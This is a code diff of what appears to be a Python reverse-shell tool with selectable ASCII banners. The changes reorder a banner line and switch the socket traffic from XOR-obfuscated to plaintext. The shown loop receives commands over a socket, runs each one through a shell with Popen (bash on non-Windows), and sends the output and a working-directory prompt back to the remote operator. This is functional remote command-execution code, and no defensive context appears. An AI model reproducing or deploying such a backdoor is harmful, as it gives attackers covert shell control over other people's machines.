@@ -129,9 +129,9 @@ if banner ==3:print(banner3)
 if banner ==4:print(banner4)
 if banner ==5:print(banner5)
 if banner ==6:print(banner6)
-if banner ==7:print(banner7)
 if banner ==8:print(banner8)
 if banner ==9:print(banner9)
+if banner ==7:print(banner7)
 if banner ==10:print(banner10)
 print(color.RED+"\n___________________________________________________________________________________\n")
 
@@ -280,12 +280,12 @@ try:
 	if os.name == "nt":
 		winflag = 1
 	cmdline = getcmdline(os.getcwd(),winflag)
-	s.send(encode_xor(cmdline))
-	# s.send(cmdline.encode())
+	#s.send(encode_xor(cmdline))
+	s.send(cmdline.encode())
 	while True:
 		data = s.recv(1024000)
-		data = xor_decode(data)
-		# data = data.decode()
+		#data = xor_decode(data)
+		data = data.decode()
 		test = Popen(data, shell=True, stdout=PIPE, stdin=PIPE, stderr=PIPE) if winflag else Popen(data, shell=True, executable="/bin/bash", stdout=PIPE, stdin=PIPE, stderr=PIPE)
 		out = test.stdout.read()
 		err = test.stderr.read()
@@ -298,11 +298,11 @@ try:
 				cmdline = getcmdline(path,winflag)
 
 
-		# data_send = op+('\\n'+cmdline).encode()
-		# s.send(data_send)
-		x = ('\\n' + cmdline).encode()
-		data_send = op + x
-		s.send(byte_xor(data_send,key))
+		data_send = op+('\\n'+cmdline).encode()
+		s.send(data_send)
+		#x = ('\\n' + cmdline).encode()
+		#data_send = op + x
+		#s.send(byte_xor(data_send,key))
 
 except:
 	pass
